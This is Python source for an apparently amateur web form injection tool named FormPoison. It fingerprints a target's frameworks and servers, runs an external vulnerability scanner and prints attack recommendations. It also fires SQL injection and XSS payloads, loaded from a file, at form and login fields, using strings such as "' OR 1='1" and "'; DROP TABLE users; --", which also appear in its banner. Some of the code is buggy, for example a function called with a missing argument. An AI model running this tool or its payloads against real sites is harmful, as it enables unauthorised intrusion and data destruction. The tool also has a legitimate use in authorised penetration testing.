import aiohttp
import asyncio
import json
import itertools
from rich.console import Console
from rich.table import Table
import argparse
import sys
import random
from bs4 import BeautifulSoup
import re
import time
from threading import Thread, Event
from rich.progress import Progress, BarColumn, TimeRemainingColumn
import threading
from selenium import webdriver
from selenium.webdriver.common.by import By
from concurrent.futures import ThreadPoolExecutor, as_completed
import urllib3
import ssl
import signal
import subprocess
import os
import tempfile
from pathlib import Path

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

skip_flag = False

# Ctrl+C
def handle_sigint(signum, frame):
    console.print("[bold red]Received Ctrl+C. Shutting down gracefully...[/bold red]")
    sys.exit(0)

signal.signal(signal.SIGINT, handle_sigint)

######################### GO SCANNER INTEGRATION ###################
class GoScannerIntegration:
    def __init__(self):
        self.scanner_path = self.find_go_scanner()
        self.console = Console()

    def find_go_scanner(self):
        possible_paths = [
            './scanner',
            './vulnerability-scanner',
            '/usr/local/bin/scanner',
            '/usr/bin/scanner',
            'scanner.exe'
        ]

        for path in possible_paths:
            if os.path.exists(path):
                return path

        # check path
        try:
            result = subprocess.run(['which', 'scanner'], capture_output=True, text=True)
            if result.returncode == 0:
                return result.stdout.strip()
        except:
            pass

        return None

    def run_go_scanner(self, url, max_urls=100, max_depth=3, workers=10):
        if not self.scanner_path:
            self.console.print("[bold red]Go scanner not found![/bold red]")
            self.console.print("Please compile the Go scanner first:")
            self.console.print("1. go mod init vulnerability-scanner")
            self.console.print("2. go mod tidy")
            self.console.print("3. go build -o scanner")
            return None

        try:
            cmd = [
                self.scanner_path,
                url,
                str(max_urls),
                str(max_depth),
                str(workers)
            ]

            self.console.print(f"[bold green]Running Go scanner: {' '.join(cmd)}[/bold green]")
            self.console.print("[yellow]Don't worry about scan time! It works just fine, but be patient during scan...[/yellow]")
            self.console.print("")

            # Animation setup
            stop_animation = Event()
            animation_thread = None

            def animation():
                spinner = itertools.cycle(['⣾', '⣽', '⣻', '⢿', '⡿', '⣟', '⣯', '⣷'])
                dots = itertools.cycle(['.', '..', '...', '....'])
                stages = [
                    "🔍 Crawling websites",
                    "📝 Analyzing source code",
                    "🛡️ Checking security patterns",
                    "📊 Generating report"
                ]
                
                stage_index = 0
                start_time = time.time()
                
                while not stop_animation.is_set():
                    elapsed = int(time.time() - start_time)
                    minutes, seconds = divmod(elapsed, 60)
                    time_str = f"{minutes:02d}:{seconds:02d}"
                    
                    current_stage = stages[stage_index]
                    spinner_char = next(spinner)
                    dots_char = next(dots)
                    
                    self.console.print(
                        f"[cyan]{spinner_char}[/cyan] [bold]{current_stage}[/bold]"
                        f"[yellow]{dots_char}[/yellow] [dim](Time: {time_str})[/dim]",
                        end="\r"
                    )
                    
                    # Change stage every 8 seconds
                    if elapsed % 8 == 0 and elapsed > 0:
                        stage_index = (stage_index + 1) % len(stages)
                    
                    time.sleep(0.2)

            # Start the animation
            animation_thread = Thread(target=animation)
            animation_thread.daemon = True
            animation_thread.start()

            # Run the scanner
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=3600)

            # Stop animation
            stop_animation.set()
            if animation_thread:
                animation_thread.join(timeout=1.0)
            
            # Clear the animation line
            self.console.print(" " * 100, end="\r")

            if result.returncode == 0:
                output_lines = result.stdout.strip().split('\n')
                if output_lines:
                    # Display the Go scanner output
                    for line in output_lines:
                        self.console.print(f"[bold cyan]{line}[/bold cyan]")
                    
                    report_file = output_lines[-1].strip()
                    if report_file and os.path.exists(report_file):
                        self.console.print("[green]✓ Scan completed successfully![/green]")
                        return report_file
                    else:
                        self.console.print(f"[bold red]Report file not found: {report_file}[/bold red]")
            else:
                self.console.print(f"[bold red]Scanner error: {result.stderr}[/bold red]")

        except subprocess.TimeoutExpired:
            stop_animation.set()
            self.console.print(" " * 100, end="\r")
            self.console.print("[bold red]Scanner timeout after 1h![/bold red]")
        except Exception as e:
            stop_animation.set()
            self.console.print(" " * 100, end="\r")
            self.console.print(f"[bold red]Scanner execution error: {e}[/bold red]")
        finally:
            stop_animation.set()

        return None

    def parse_scan_report(self, report_file):
        if not report_file:
            self.console.print("[bold red]No report file provided![/bold red]")
            return None

        try:
            with open(report_file, 'r', encoding='utf-8') as f:
                report = json.load(f)
            return report
        except FileNotFoundError:
            self.console.print(f"[bold red]Report file not found: {report_file}[/bold red]")
            return None
        except json.JSONDecodeError:
            self.console.print(f"[bold red]Invalid JSON format in report file: {report_file}[/bold red]")
            return None
        except Exception as e:
            self.console.print(f"[bold red]Error parsing scan report: {e}[/bold red]")
            return None

    def generate_attack_recommendations(self, scan_report):
        recommendations = []

        if not scan_report or 'vulnerabilities' not in scan_report:
            return recommendations

        vuln_types = set()
        for vuln in scan_report['vulnerabilities']:
            vuln_types.add(vuln['pattern'])

        # map for possible vulns based on scanner output
        attack_mapping = {
            'length_validator': [
                "Type Confusion Attack - Send malformed objects with custom length property",
                "Array manipulation - Bypass length validation"
            ],
            'size_validator': [
                "Collection manipulation - Bypass size checks",
                "Object prototype pollution"
            ],
            'array_index_check': [
                "Array index manipulation - Out of bounds access",
                "Type confusion in array access"
            ],
            'instanceof_check': [
                "Type confusion - Fake object types",
                "Prototype pollution to bypass instanceof"
            ],
            'type_casting': [
                "Type casting bypass - Malformed type casting",
                "Object manipulation during casting"
            ],
            'sql_injection': [
                "SQL Injection - Standard SQLi payloads",
                "Blind SQL Injection",
                "Time-based SQL Injection"
            ],
            'xss': [
                "XSS - Standard XSS payloads",
                "DOM-based XSS",
                "Stored XSS"
            ],
            'command_injection': [
                "Command Injection - OS command execution",
                "Remote code execution"
            ],
            'insecure_deserialization': [
                "Insecure Deserialization - Malicious object deserialization",
                "Remote code execution via deserialization"
            ]
        }

        for vuln_type in vuln_types:
            if vuln_type in attack_mapping:
                recommendations.extend(attack_mapping[vuln_type])

        return list(set(recommendations))

    def scan_and_analyze(self, url, max_urls=100, max_depth=3, workers=10):
        # full analysis with GO scanner
        self.console.print(f"[bold blue]Starting Go scanner for: {url}[/bold blue]")

        # run scan
        report_file = self.run_go_scanner(url, max_urls, max_depth, workers)

        if not report_file:
            self.console.print("[bold red]Scan failed! No report file generated.[/bold red]")
            return []

        # parsing raport
        scan_report = self.parse_scan_report(report_file)

        if not scan_report:
            self.console.print("[bold yellow]Failed to parse scan report[/bold yellow]")
            return []

        self.console.print(f"[bold green]Scan completed![/bold green]")
        self.console.print(f"URLs scanned: {scan_report.get('scanned_urls', 0)}")
        self.console.print(f"Vulnerabilities found: {len(scan_report.get('vulnerabilities', []))}")

        recommendations = self.generate_attack_recommendations(scan_report)

        if recommendations:
            self.console.print("[bold green]Attack recommendations:[/bold green]")
            for recommendation in recommendations:
                self.console.print(f"[yellow]- {recommendation}[/yellow]")
        else:
            self.console.print("[bold yellow]No specific attack recommendations from Go scanner.[/bold yellow]")

        return recommendations
#########################DETECTIONS###################
def detect_framework(headers, content):
    framework_detected = None
    version = None

    # by headers
    if 'X-Powered-By' in headers:
        x_powered_by = headers['X-Powered-By'].lower()
        if 'express' in x_powered_by:
            framework_detected = 'Express.js'
            version = x_powered_by.split('express/')[-1].split()[0] if 'express/' in x_powered_by else None
        elif 'laravel' in x_powered_by:
            framework_detected = 'Laravel'
            version = x_powered_by.split('laravel/')[-1].split()[0] if 'laravel/' in x_powered_by else None
        elif 'django' in x_powered_by:
            framework_detected = 'Django'
            version = x_powered_by.split('django/')[-1].split()[0] if 'django/' in x_powered_by else None
        elif 'flask' in x_powered_by:
            framework_detected = 'Flask'
            version = x_powered_by.split('flask/')[-1].split()[0] if 'flask/' in x_powered_by else None
        elif 'asp.net' in x_powered_by:
            framework_detected = 'ASP.NET'
            version = x_powered_by.split('asp.net/')[-1].split()[0] if 'asp.net/' in x_powered_by else None

    # by html code
    if not framework_detected:
        content_lower = content.lower()
        if '<!-- django version' in content_lower:
            framework_detected = 'Django'
            version = content_lower.split('<!-- django version ')[1].split('-->')[0].strip()
        elif '<div id="root"></div>' in content_lower:
            framework_detected = 'React'
        elif '<app-root></app-root>' in content_lower:
            framework_detected = 'Angular'
        elif '<div id="app"></div>' in content_lower:
            framework_detected = 'Vue.js'
        elif '<!-- laravel' in content_lower:
            framework_detected = 'Laravel'
            version = content_lower.split('<!-- laravel ')[1].split('-->')[0].strip()
        elif '<!-- symfony' in content_lower:
            framework_detected = 'Symfony'
            version = content_lower.split('<!-- symfony ')[1].split('-->')[0].strip()
        elif '<!-- ruby on rails' in content_lower:
            framework_detected = 'Ruby on Rails'
            version = content_lower.split('<!-- ruby on rails ')[1].split('-->')[0].strip()

    # by different endpoints
    if not framework_detected:
        if '/static/' in content_lower:
            framework_detected = 'Django'
        elif '/public/' in content_lower:
            framework_detected = 'Express.js'
        elif '/api/' in content_lower:
            framework_detected = 'Laravel'

    return framework_detected, version

def detect_cms(content):
    cms_detected = None
    version = None

    content_lower = content.lower()

    # WordPress
    if '/wp-content/' in content_lower or '/wp-admin/' in content_lower:
        cms_detected = 'WordPress'
        if '<!-- wordpress version' in content_lower:
            version = content_lower.split('<!-- wordpress version ')[1].split('-->')[0].strip()

    # Joomla
    elif '/media/jui/' in content_lower or '/administrator/' in content_lower:
        cms_detected = 'Joomla'
        if '<!-- joomla version' in content_lower:
            version = content_lower.split('<!-- joomla version ')[1].split('-->')[0].strip()

    # Drupal
    elif '/sites/default/' in content_lower or '/core/assets/' in content_lower:
        cms_detected = 'Drupal'
        if '<!-- drupal version' in content_lower:
            version = content_lower.split('<!-- drupal version ')[1].split('-->')[0].strip()

    # Magento
    elif '/skin/frontend/' in content_lower or '/media/css/' in content_lower:
        cms_detected = 'Magento'
        if '<!-- magento version' in content_lower:
            version = content_lower.split('<!-- magento version ')[1].split('-->')[0].strip()

    # Shopify
    elif 'shopify' in content_lower or 'cdn.shopify.com' in content_lower:
        cms_detected = 'Shopify'
        if '<!-- shopify version' in content_lower:
            version = content_lower.split('<!-- shopify version ')[1].split('-->')[0].strip()

    return cms_detected, version

def detect_libraries(content):
    libraries_detected = []

    content_lower = content.lower()

    # Bootstrap
    if 'bootstrap.min.css' in content_lower or 'bootstrap.min.js' in content_lower:
        version = None
        if 'bootstrap.min.css' in content_lower:
            # Poprawione extractowanie wersji
            version_match = re.search(r'bootstrap(?:\.min)?\.css\?v=([\d.]+)', content_lower)
            version = version_match.group(1) if version_match else None
        libraries_detected.append(('Bootstrap', version))
    elif 'container' in content_lower and 'row' in content_lower and 'col-md-' in content_lower:
        libraries_detected.append(('Bootstrap', None))

    # Tailwind CSS
    if 'tailwind.min.css' in content_lower or 'bg-blue-' in content_lower or 'text-center' in content_lower:
        version = None
        if 'tailwind.min.css' in content_lower:
            version_match = re.search(r'tailwind(?:\.min)?\.css\?v=([\d.]+)', content_lower)
            version = version_match.group(1) if version_match else None
        libraries_detected.append(('Tailwind CSS', version))

    # jQuery
    if 'jquery.min.js' in content_lower or 'jquery.js' in content_lower or 'jquery(' in content_lower:
        version = None
        if 'jquery.min.js' in content_lower:
            version_match = re.search(r'jquery(?:\.min)?\.js\?v=([\d.]+)', content_lower)
            version = version_match.group(1) if version_match else None
        libraries_detected.append(('jQuery', version))

    # Lodash
    if 'lodash.min.js' in content_lower or '_.' in content_lower:
        version = None
        if 'lodash.min.js' in content_lower:
            version_match = re.search(r'lodash(?:\.min)?\.js\?v=([\d.]+)', content_lower)
            version = version_match.group(1) if version_match else None
        libraries_detected.append(('Lodash', version))

    # Materialize
    if 'materialize.min.css' in content_lower or 'materialize.min.js' in content_lower:
        version = None
        if 'materialize.min.css' in content_lower:
            version_match = re.search(r'materialize(?:\.min)?\.css\?v=([\d.]+)', content_lower)
            version = version_match.group(1) if version_match else None
        libraries_detected.append(('Materialize', version))

    # Foundation
    if 'foundation.min.css' in content_lower or 'foundation.min.js' in content_lower:
        version = None
        if 'foundation.min.css' in content_lower:
            version_match = re.search(r'foundation(?:\.min)?\.css\?v=([\d.]+)', content_lower)
            version = version_match.group(1) if version_match else None
        libraries_detected.append(('Foundation', version))

    # Bulma
    if 'bulma.min.css' in content_lower or 'bulma.css' in content_lower:
        version = None
        if 'bulma.min.css' in content_lower:
            version_match = re.search(r'bulma(?:\.min)?\.css\?v=([\d.]+)', content_lower)
            version = version_match.group(1) if version_match else None
        libraries_detected.append(('Bulma', version))

    # Semantic UI
    if 'semantic.min.css' in content_lower or 'semantic.min.js' in content_lower:
        version = None
        if 'semantic.min.css' in content_lower:
            version_match = re.search(r'semantic(?:\.min)?\.css\?v=([\d.]+)', content_lower)
            version = version_match.group(1) if version_match else None
        libraries_detected.append(('Semantic UI', version))

    # Moment.js
    if 'moment.min.js' in content_lower or 'moment.js' in content_lower:
        version = None
        if 'moment.min.js' in content_lower:
            version_match = re.search(r'moment(?:\.min)?\.js\?v=([\d.]+)', content_lower)
            version = version_match.group(1) if version_match else None
        libraries_detected.append(('Moment.js', version))

    # Chart.js
    if 'chart.min.js' in content_lower or 'chart.js' in content_lower:
        version = None
        if 'chart.min.js' in content_lower:
            version_match = re.search(r'chart(?:\.min)?\.js\?v=([\d.]+)', content_lower)
            version = version_match.group(1) if version_match else None
        libraries_detected.append(('Chart.js', version))

    return libraries_detected

def detect_server_technology(headers):
    server_tech = None
    version = None

    if 'Server' in headers:
        server = headers['Server'].lower()
        if 'apache' in server:
            server_tech = 'Apache'
            version = server.split('apache/')[-1].split()[0] if 'apache/' in server else None
        elif 'nginx' in server:
            server_tech = 'Nginx'
            version = server.split('nginx/')[-1].split()[0] if 'nginx/' in server else None
        elif 'iis' in server:
            server_tech = 'IIS'
            version = server.split('iis/')[-1].split()[0] if 'iis/' in server else None

    return server_tech, version

def detect_cdn(headers):
    cdn_detected = None
    version = None

    if 'Server' in headers:
        server = headers['Server'].lower()
        if 'cloudflare' in server:
            cdn_detected = 'Cloudflare'
            version = server.split('cloudflare/')[-1].split()[0] if 'cloudflare/' in server else None
        elif 'akamai' in server:
            cdn_detected = 'Akamai'
            version = server.split('akamai/')[-1].split()[0] if 'akamai/' in server else None
        elif 'aws' in server:
            cdn_detected = 'AWS CloudFront'
            version = server.split('aws/')[-1].split()[0] if 'aws/' in server else None

    return cdn_detected, version

def detect_ssl(url):
    import ssl
    import socket
    from datetime import datetime

    try:
        hostname = url.split('//')[1].split('/')[0]
        context = ssl.create_default_context()
        with socket.create_connection((hostname, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()

        # valid until
        expire_date = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
        issuer = dict(x[0] for x in cert['issuer'])['organizationName']

        return f"Valid until {expire_date}, Issuer: {issuer}"
    except Exception as e:
        return f"SSL/TLS Error: {e}"
###############################################################


console = Console()
go_scanner = GoScannerIntegration()  #go scanner init


##################SCANNING MODE##############################
async def scan_website(url, headers, content):
    results = []

    # detect framework
    framework_detected, framework_version = detect_framework(headers, content)
    if framework_detected:
        if framework_version:
            results.append(("Framework", f"{framework_detected} (v{framework_version})"))
        else:
            results.append(("Framework", framework_detected))

    # detect CSS/JS libraries
    libraries_detected = detect_libraries(content)
    if libraries_detected:
        libraries_info = []
        for lib, version in libraries_detected:
            if version:
                libraries_info.append(f"{lib} (v{version})")
            else:
                libraries_info.append(lib)
        results.append(("Libraries", ", ".join(libraries_info)))

    # detect CMS
    cms_detected, cms_version = detect_cms(content)
    if cms_detected:
        if cms_version:
            results.append(("CMS", f"{cms_detected} (v{cms_version})"))
        else:
            results.append(("CMS", cms_detected))

    # detect server technology
    server_tech, server_version = detect_server_technology(headers)
    if server_tech:
        if server_version:
            results.append(("Server Technology", f"{server_tech} (v{server_version})"))
        else:
            results.append(("Server Technology", server_tech))

    # detect CDN
    cdn_detected, cdn_version = detect_cdn(headers)
    if cdn_detected:
        if cdn_version:
            results.append(("CDN", f"{cdn_detected} (v{cdn_version})"))
        else:
            results.append(("CDN", cdn_detected))

    # SSL/TLS
    ssl_info = detect_ssl(url)
    if ssl_info:
        results.append(("SSL/TLS", ssl_info))

    return results

async def scan(url):
    headers = {'User-Agent': 'Mozilla/5.0'}
    try:
        ssl_context = ssl.create_default_context()
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
            async with session.get(url, headers=headers) as response:
                content = await response.text()
                headers = response.headers
                results = await scan_website(url, headers, content)

                # table w results
                table = Table(title="Scan Results")
                table.add_column("Category", style="cyan")
                table.add_column("Value", style="magenta")

                for category, value in results:
                    table.add_row(category, value)

                console.print(table)
    except Exception as e:
        console.print(f"[bold red]Error scanning {url}: {e}[/bold red]")
#######################################################################

def sanitize_user_agent(user_agent):
    return re.sub(r'[^\x00-\x7F]+', '', user_agent)

def show_banner():
    banner = r"""
  [bold blue]Form[/bold blue]                                 .--.
      [bold red]Poison[/bold red]                  ,-.------+-.|  ,-.
                  ,--=======* )"("")===)===* )
                              `-"---==-+-"|  `-"
                                       '--'
    """
    RED = '\033[91m'
    GREEN = '\033[92m'
    BLUE = '\033[94m'
    RESET = '\033[0m'

    staticbanner = f"""
  {BLUE}Form{RESET}                                 .--.
      {RED}Poison{RESET}                  ,-.------+-.|  ,-.
                  ,--=======* )"("")===)===* )
                              `-"---==-+-"|  `-"
                                       '--'
              Input fields and forms injection framework.
              Developed by: https://github.com/csshark
              Note: This tool is amateur I didn't launch thousands of tests so there might be bugs.
    """

    def animate_falling_texts(texts, banner, start_line=0, end_line=3):
        banner_lines = banner.split('\n')
        max_lines = len(banner_lines) + end_line
        for text in texts:
            for i in range(start_line, max_lines):
                console.clear()
                console.print(banner)
                console.print('\n' * i + "\t" + text)
                time.sleep(0.01)

    falling_words = [
        "<script>",
        "alert(1)",
        "' OR 1=1;",
        "<audio src=x onerror=alert('XSS')>",
        "<noscript>Sorry, your browser does not support Html</noscript>",
        "<img src=x onerror=alert(1)>",
        "1=1; --",
        "<svg/onload=alert(1)>",
        "'; DROP TABLE users; --",
        "<iframe src=javascript:alert(1)>",
        "H4CK3D",
        "403 HTTP",
        "User-Agent: Fake Geco",
        "Error: ",
        "POST /api/endpoint 1.1. HTTP",
        "password",
        "MySQL: error.",
        "[ XSS! ]",
        "Response: 200 OK"
    ]

    animate_falling_texts(falling_words, banner)
    print(staticbanner)
    print("Framework Initialization Done.")

def parse_cookies(cookie_str):
    cookies = {}
    if cookie_str:
        for pair in cookie_str.split(';'):
            if '=' in pair:
                key, value = pair.strip().split('=', 1)
                cookies[key] = value
    return cookies

def parse_proxy(proxy_url):
    if not proxy_url:
        return None

    if "@" in proxy_url:
        proxy_parts = proxy_url.split("://")[1].split("@")
        auth_part = proxy_parts[0]
        proxy_domain = proxy_parts[1]
        proxy_url = f"http://{proxy_domain}"
        proxy_auth = auth_part
    else:
        proxy_auth = None

    proxies = {
        "http": proxy_url,
        "https": proxy_url
    }

    if proxy_auth:
        proxies["http"] = f"http://{proxy_auth}@{proxy_domain}"
        proxies["https"] = f"https://{proxy_auth}@{proxy_domain}"

    return proxies

def load_payloads(file_path):
    try:
        with open(file_path, 'r') as f:
            return json.load(f)
    except FileNotFoundError:
        console.print(f"[bold red]Error: Payload file '{file_path}' not found.[/bold red]")
        sys.exit(1)
    except json.JSONDecodeError:
        console.print(f"[bold red]Error: Invalid JSON in payload file '{file_path}'.[/bold red]")
        sys.exit(1)

def filter_payloads(payloads, filter_patterns):
    if not filter_patterns:
        return payloads

    filtered_payloads = []
    for payload in payloads:
        for pattern in filter_patterns:
            if pattern.lower() in payload['inputField'].lower():
                filtered_payloads.append(payload)
                break

    return filtered_payloads

async def get_page_content(url, user_agent, proxies=None, ssl_cert=None, ssl_key=None, ssl_verify=False):
    headers = {'User-Agent': sanitize_user_agent(user_agent)}
    try:
        ssl_context = ssl.create_default_context()
        if ssl_cert and ssl_key:
            ssl_context.load_cert_chain(ssl_cert, ssl_key)
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
            async with session.get(url, headers=headers, proxy=proxies.get('http') if proxies else None, ssl=ssl_verify) as response:
                return await response.text()
    except Exception as e:
        console.print(f"[bold red]Error fetching page: {e}[/bold red]")
        return None

def get_page_content_with_selenium(url):
    options = webdriver.ChromeOptions()
    options.add_argument('--headless')
    driver = webdriver.Chrome(options=options)
    driver.get(url)
    time.sleep(3)
    content = driver.page_source
    driver.quit()
    return content

def analyze_response_content(content):
    content = content.lower()
    vulnerabilities = []

    # SQL Injection
    sql_errors = [
        r"sql syntax.*error",
        r"warning: mysql",
        r"unclosed quotation mark",
        r"you have an error in your sql syntax",
        r"ora-\d{5}",
        r"postgresql.*error",
        r"sql server.*error"
    ]
    for error in sql_errors:
        if re.search(error, content):
            vulnerabilities.append(f"SQL Injection (Detected: {error})")

    # XSS
    xss_patterns = [
        r"<script>",
        r"alert\(",
        r"onerror=",
        r"onload=",
        r"javascript:"
    ]
    for pattern in xss_patterns:
        if re.search(pattern, content):
            vulnerabilities.append(f"XSS (Detected: {pattern})")

    # HTML Injection
    if "<html>" in content or "<body>" in content:
        vulnerabilities.append("HTML Injection")

    return vulnerabilities

def analyze_response_headers(headers):
    vulnerabilities = []
    security_headers = {
        "Content-Security-Policy": "Missing Content-Security-Policy header",
        "X-Frame-Options": "Missing X-Frame-Options header",
        "X-XSS-Protection": "Missing X-XSS-Protection header",
        "Strict-Transport-Security": "Missing Strict-Transport-Security header",
        "Referrer-Policy": "Missing Referrer-Policy header",
        "Feature-Policy": "Missing Feature-Policy header",
        "Expect-CT": "Missing Expect-CT header",
        "X-Content-Type-Options": "Missing X-Content-Type-Options header"
    }

    for header, message in security_headers.items():
        if header not in headers:
            vulnerabilities.append(message)

    if "Server" in headers:
        vulnerabilities.append(f"Server Information Leak: {headers['Server']}")
    if "X-Powered-By" in headers:
        vulnerabilities.append(f"Framework Information Leak: {headers['X-Powered-By']}")

    return vulnerabilities

# second checks: 

def is_payload_executed(content, payload):
    # check for execution if word from payload is present
    return payload.lower() in content.lower()

def is_xss_executed(content, payload):
    # checking for xss
    xss_keywords = ['alert', 'xss', 'javascript', 'onerror', 'onload']
    return any(keyword in content.lower() for keyword in xss_keywords)

def is_sql_injection_successful(content, payload):
    # sql injection response possibilites
    sql_errors = [
        r"sql syntax.*error",                      
        r"warning: mysql",                         
        r"unclosed quotation mark",                
        r"you have an error in your sql syntax",   
        r"ora-\d{5}",                              
        r"postgresql.*error",                      
        r"sql server.*error",                      
        r"syntax error",                           
        r"mysql_fetch_array",                      
        r"mysql_num_rows",                         
        r"mysql_query",                            
        r"mysqli_query",                           
        r"pdoexception",                          
        r"sqlite3.*error",                         
        r"column not found",                       
        r"table not found",                        
        r"unknown column",                         
        r"unknown table",                          
        r"sql command not properly ended",         
    ]

    # check for errs
    for error in sql_errors:
        if re.search(error, content, re.IGNORECASE):
            return True

    # check for payload content in response
    if payload.lower() in content.lower():
        return True

    return False

def analyze_response(content, headers, payload_category, payload, verbose_all=False):
    vulnerabilities = []
    content_vulns = analyze_response_content(content)
    vulnerabilities.extend(content_vulns)
    header_vulns = analyze_response_headers(headers)
    vulnerabilities.extend(header_vulns)

    # framework detection
    framework_detected, framework_version = detect_framework(headers, content)
    if framework_detected:
        if framework_version:
            vulnerabilities.append(f"Framework Detected: {framework_detected} (v{framework_version})")
        else:
            vulnerabilities.append(f"Framework Detected: {framework_detected}")

    # libs detection
    libraries_detected = detect_libraries(content)
    if libraries_detected:
        libs_info = []
        for lib_name, lib_version in libraries_detected:
            if lib_version:
                libs_info.append(f"{lib_name} (v{lib_version})")
            else:
                libs_info.append(lib_name)
        vulnerabilities.append(f"Libraries Detected: {', '.join(libs_info)}")

    # additional verification
    if payload_category == "SQL" and is_sql_injection_successful(content, payload):
        if is_payload_executed(content, payload):
            console.print("[bold red]💀 SQL INJECTED 💀[/bold red]")
            console.print("[bold green]✅ Payload executed successfully![/bold green]")

    if payload_category == "HTML" and is_xss_executed(content, payload):
        if is_xss_executed(content):
            console.print("[bold red]💀 XSS INJECTED 💀[/bold red]")
            console.print("[bold green]✅ XSS payload executed successfully![/bold green]")

    if verbose_all:
        console.print(f"[bold yellow]Full response analysis:[/bold yellow]")
        console.print(f"[yellow]{vulnerabilities}[/yellow]")

    return vulnerabilities

async def test_input_field(url, payloads, threat_type, cookies, user_agent, input_field, method="POST", proxies=None, ssl_cert=None, ssl_key=None, ssl_verify=False, verbose=False, verbose_all=False, filter=None, secs=0):
    results = []
    positive_responses = 0
    threshold = len(payloads) * 0.5

    table = Table(title=f"Input Field Test Results (User-Agent: {user_agent}, Method: {method})")
    table.add_column("Payload", style="cyan", no_wrap=False)
    table.add_column("Response Code", justify="right", style="magenta")
    table.add_column("Vulnerability Detected", style="bold green")

    # Pobierz wszystkie pola formularza
    content = await get_page_content(url, user_agent, proxies, ssl_cert, ssl_key, ssl_verify)
    soup = BeautifulSoup(content, 'html.parser')
    all_input_fields = soup.find_all('input', {'type': ['text', 'password', 'email']})

    async def test_payload(payload):
        try:
            headers = {'User-Agent': sanitize_user_agent(user_agent)}
            data = {}

            # typical input fill
            for field in all_input_fields:
                field_name = field.get('name', 'input_field')
                if field_name == input_field.get('name', 'input_field'):
                    # payload fill
                    data[field_name] = payload['inputField']
                else:
                    # rest of fields common values
                    if field.get('type') == 'email':
                        data[field_name] = 'test@example.com'
                    elif field.get('type') == 'password':
                        # password case
                        data[field_name] = 'password123'
                    elif field.get('name', '').lower() in ['username', 'user', 'login']:
                        # login case
                        data[field_name] = 'test_user'
                    else:
                        # rest of cases
                        data[field_name] = 'test_value'

            ssl_context = ssl.create_default_context()
            if ssl_cert and ssl_key:
                ssl_context.load_cert_chain(ssl_cert, ssl_key)

            cookie_jar = aiohttp.CookieJar()
            for key, value in cookies.items():
                cookie_jar.update_cookies({key: value})

            async with aiohttp.ClientSession(cookie_jar=cookie_jar, connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
                if method == "GET":
                    async with session.get(url, params=data, headers=headers, proxy=proxies.get('http') if proxies else None, ssl=ssl_verify) as response:
                        content = await response.text()
                        status_code = response.status
                elif method == "POST":
                    async with session.post(url, data=data, headers=headers, proxy=proxies.get('http') if proxies else None, ssl=ssl_verify) as response:
                        content = await response.text()
                        status_code = response.status
                elif method == "PUT":
                    async with session.put(url, data=data, headers=headers, proxy=proxies.get('http') if proxies else None, ssl=ssl_verify) as response:
                        content = await response.text()
                        status_code = response.status
                elif method == "DELETE":
                    async with session.delete(url, data=data, headers=headers, proxy=proxies.get('http') if proxies else None, ssl=ssl_verify) as response:
                        content = await response.text()
                        status_code = response.status

                vulnerabilities = analyze_response(content, response.headers, payload['category'], payload['inputField'], verbose_all)

                results.append({
                    "payload": payload['inputField'],
                    "response_code": status_code,
                    "vulnerabilities": vulnerabilities
                })
                table.add_row(payload['inputField'], str(status_code), ", ".join(vulnerabilities))
                if verbose or verbose_all:
                    console.print(f"[bold blue]Testing payload: {payload['inputField']}[/bold blue]")
                    console.print(f"[bold blue]Response code: {status_code}[/bold blue]")
                    console.print(f"[bold blue]Possible Vulnerabilities/Issues: {', '.join(vulnerabilities)}[/bold blue]")
                    if verbose_all:
                        console.print(f"[bold yellow]Response content:[/bold yellow]")
                        console.print(f"[yellow]{content}[/yellow]")
        except Exception as e:
            table.add_row(payload['inputField'], "Error", f"Request Failed: {str(e)}")
            if verbose or verbose_all:
                console.print(f"[bold red]Error testing payload: {payload['inputField']}[/bold red]")
                console.print(f"[bold red]Error: {str(e)}[/bold red]")

    # bar
    with Progress(BarColumn(bar_width=None), "[progress.percentage]{task.percentage:>3.0f}%", TimeRemainingColumn(), console=console) as progress:
        task = progress.add_task("[cyan]Testing...", total=len(payloads))

        for payload in payloads:
            await test_payload(payload)
            progress.update(task, advance=1)
            if secs > 0:
                await asyncio.sleep(secs)

    positive_responses = sum(1 for r in results if r['response_code'] == 200)
    if positive_responses > threshold:
        console.print(f"[bold red]Too many positive responses were given ({positive_responses}/{len(payloads)}). You might consider this result as false-positive.[/bold red]")

    console.print(table)
    with open("test_results.json", "w") as f:
        json.dump(results, f, indent=4)
    console.print(f"[bold green]Test results saved to 'test_results.json'[/bold green]")


async def test_login_input_fields(url, payloads, cookies, user_agent, input_fields, proxies=None, verbose=False, verbose_all=False, secs=0):
    results = []

    table = Table(title=f"Login Input Field Test Results (User-Agent: {user_agent})")
    table.add_column("Login Payload", style="cyan", no_wrap=False)
    table.add_column("Password Payload", style="cyan", no_wrap=False)
    table.add_column("Response Code", justify="right", style="magenta")
    table.add_column("Vulnerability Detected", style="bold green")

    login_field = None
    password_field = None

    content = get_page_content_with_selenium(url)
    soup = BeautifulSoup(content, 'html.parser')
    input_fields = soup.find_all('input', {'type': ['text', 'password', 'email']})

    console.print(f"[bold yellow]Found input fields:[/bold yellow]")
    for field in input_fields:
        name = field.get('name', '')
        id_ = field.get('id', '')
        placeholder = field.get('placeholder', '')
        console.print(f"[bold blue]Field: name={name}, id={id_}, placeholder={placeholder}[/bold blue]")

    for field in input_fields:
        name = field.get('name', '').lower()
        id_ = field.get('id', '').lower()
        placeholder = field.get('placeholder', '').lower()

        login_keywords = ['login', 'username', 'user', 'email', 'e-mail', 'mail', 'userid', 'user_id', 'loginname', 'account', 'mat-input-1']
        if any(keyword in name or keyword in id_ or keyword in placeholder for keyword in login_keywords):
            login_field = field
            console.print(f"[bold green]Found login field: id={id_}[/bold green]")

        password_keywords = ['password', 'pass', 'passwd', 'pwd', 'userpassword', 'user_pass']
        if any(keyword in name or keyword in id_ or keyword in placeholder for keyword in password_keywords):
            password_field = field
            console.print(f"[bold green]Found password field: {name}[/bold green]")

    if not login_field or not password_field:
        console.print("[bold yellow]No login or password fields found for login testing.[/bold yellow]")
        return

    login_payloads = ["admin", "test", "user", "' OR 1='1"]
    sql_payloads = [payload['inputField'] for payload in payloads if payload['category'] == "SQL"]

